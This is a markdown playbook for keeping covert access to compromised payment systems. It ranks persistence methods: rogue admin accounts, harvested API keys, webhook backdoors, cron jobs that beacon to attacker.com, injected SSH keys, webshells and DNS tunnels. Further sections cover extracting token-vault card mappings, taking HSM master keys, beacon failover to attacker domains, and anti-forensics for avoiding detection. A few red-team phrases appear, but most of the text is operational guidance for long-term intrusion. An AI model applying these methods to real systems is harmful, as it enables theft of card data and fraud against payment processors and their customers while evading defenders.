# PERSISTENCE — Establishing and Maintaining Access

## Core Principle

Every successful exploitation is useless without persistence. You get in, you establish access, you make sure you can get back in. This is the foundation of operational continuity.

**Rule:** Never stop an engagement without establishing at least 2 independent persistence mechanisms.

---

## Persistence Hierarchy

### Tier 1 — Highest Reliability (Use First)

**1. Admin Account Creation**
```
Target: Payment gateway admin panel
Method: Register new account + privilege escalation
Tools: 
  - Burp Suite for privilege manipulation
  - SQL injection to create admin directly
  - API key generation via admin functions

Detection risk: MEDIUM (new account visible in logs)
Reliability: HIGH
```

**2. API Key Harvesting**
```
Target: Internal payment API
Method: 
  - Extract from environment variables if shell access gained
  - Sniff API keys from intercepted traffic
  - Generate new keys via admin API

Detection risk: LOW (API keys blend with legitimate traffic)
Reliability: HIGH
```

**3. Webhook Backdoor**
```
Target: Webhook endpoint
Method:
  - Register attacker-controlled URL as legitimate webhook
  - Modify existing webhook to exfiltrate data
  - Add new webhook route pointing to attacker server

Detection risk: MEDIUM (new webhook visible in config)
Reliability: HIGH (bypasses auth for incoming callbacks)
```

### Tier 2 — Medium Reliability (Use When Tier 1 Unavailable)

**4. Cron-Based Callbacks**
```
Target: Server with cron access
Method:
  - Add cron job: curl attacker.com/beacon every 5 minutes
  - wget/curl with data exfiltration
  - Python/bash script for more complex operations

Detection risk: MEDIUM-HIGH (cron visible in crontab)
Reliability: MEDIUM (depends on server stability)
```

**5. SSH Key Injection**
```
Target: Server with SSH access
Method:
  - Add SSH public key to authorized_keys
  - Create new service account with SSH access
  - Modify SSH config for passwordless access

Detection risk: HIGH (SSH keys visible)
Reliability: MEDIUM (depends on SSH service running)
```

**6. Startup Script Injection**
```
Target: Linux server with startup configuration
Method:
  - Add to /etc/rc.local, /etc/init.d/, systemd service
  - Modify existing startup scripts
  - Create new systemd service unit

Detection risk: HIGH (visible in startup config)
Reliability: MEDIUM (survives reboot)
```

### Tier 3 — Low Reliability (Emergency Only)

**7. Webshell**
```
Target: Any web-accessible endpoint
Method:
  - Upload web shell via file upload vulnerability
  - Inject shell into existing file (log poisoning)
  - Exploit existing file manager functionality

Detection risk: VERY HIGH
Reliability: LOW (depends on specific vulns)
```

**8. DNS Tunnel**
```
Target: Any server with DNS access
Method:
  - Configure subdomain to attacker DNS server
  - Encode data in DNS queries
  - Use dnscat2 or iodine for full tunnel

Detection risk: MEDIUM (unusual DNS patterns)
Reliability: LOW (slow, complex setup)
```

---

## Payment-Specific Persistence

### Token Vault Access

If token vault is accessible:
```
1. Extract token-to-card mappings
2. Generate persistent API keys for vault access
3. Create backdoor service account in vault admin
4. Document vault access for future operations

This is the highest value persistence for payment targets.
If you can maintain token vault access, you can operate indefinitely.
```

### HSM Persistence (CRITICAL TARGETS ONLY)

Master key access enables:
```
- Generate new authentication credentials
- Decrypt stored card data
- Create fake transaction authentication
- Full payment system control

Only attempt if:
  - Target is P1 priority (enterprise processor)
  - HSM access confirmed
  - Master key extraction confirmed
  - No alternative persistence works

WARNING: HSM persistence = highest detection risk
```

### Merchant Account Backdoor

```
1. Create new merchant account with full access
2. Elevate merchant privileges to admin
3. Add additional admin accounts to merchant
4. Configure webhook for merchant → attacker server
5. Document merchant ID + credentials for future use

Detection risk: MEDIUM
Reliability: HIGH (legitimate merchant account blends in)
```

---

## Persistence Execution Checklist

Before establishing persistence:

- [ ] Confirm access is stable (not a one-time exploit)
- [ ] Identify target OS and services
- [ ] Map existing user accounts and privileges
- [ ] Identify startup mechanisms (cron, systemd, init scripts)
- [ ] Identify logging mechanisms (what will be visible)
- [ ] Prepare cleanup commands (for evidence removal if needed)

Establishing persistence:

- [ ] Establish Tier 1 mechanism first (admin account or API key)
- [ ] Establish Tier 2 mechanism second (cron or SSH key)
- [ ] Document all persistence mechanisms in evidence
- [ ] Test each mechanism independently
- [ ] Verify persistence survives reboot (if applicable)
- [ ] Configure beacon schedule (not so frequent it triggers alerts)

---

## Persistence Documentation

Every persistence mechanism must be documented:

```yaml
persistence_mechanism:
  type: <admin_account|api_key|webhook|cron|ssh|startup|webshell>
  target: <system/service affected>
  created: YYYY-MM-DD HH:MM
  reliability: <HIGH|MEDIUM|LOW>
  detection_risk: <HIGH|MEDIUM|LOW>
  access_method: |
    How to use this persistence:
    1. <step>
    2. <step>
  
  cleanup: |
    How to remove (for legal/compliance purposes):
    1. <step>
  
  evidence:
    - <screenshot of creation>
    - - <config file showing persistence>
    - - <log showing activation>
```

---

## Beacon Configuration

### Timing

| Environment | Interval | Rationale |
|---|---|---|
| Aggressive (active op) | 2-5 minutes | Fast response, higher detection risk |
| Standard | 15-30 minutes | Balanced, standard for red team |
| Stealth | 1-4 hours | Low detection, acceptable response time |
| Archival | Daily | Minimal footprint, check-in only |

### Beacon Content

```
Standard beacon:
  - Timestamp
  - Hostname
  - Current user
  - Last command output (if any)
  - Target status (active/recon/operations)

Heavy beacon (first check-in):
  - All of above +
  - Network interfaces
  - Installed software
  - Running processes
  - File system summary
```

### Beacon Failover

```
Primary beacon: https://attacker.com/beacon
  ↓ (fails after 3 attempts)
Secondary beacon: https://attacker-backup.com/checkin
  ↓ (fails after 3 attempts)
Archive mode: Log locally, exfiltrate when primary returns
```

---

## Persistence Verification

Test persistence mechanisms:

1. **Disconnect and reconnect** — verify access still works
2. **Reboot test** — if possible, verify startup persistence
3. **Log review** — check if persistence creation appears in logs
4. **Cross-check** — verify all mechanisms still functional 24h later

---

## Persistence Removal (Post-Engagement)

If legal/compliance requires cleanup:

```
1. Do NOT remove persistence during active engagement
2. Document removal steps for post-engagement use
3. Reece must approve removal
4. Remove in reverse order of creation
5. Verify removal is complete
6. Document final state in evidence
```

---

## Anti-Forensics

Minimize persistence footprint:

- Use legitimate-looking credentials (admin@payment-platform.com)
- Schedule beacons at random intervals (jitter: ±10%)
- Use existing system binaries for operations (no custom malware)
- Rotate persistence credentials every 30 days
- Blend beacon traffic with normal HTTPS (no unusual headers)
- Use legitimate CDN for beacon communication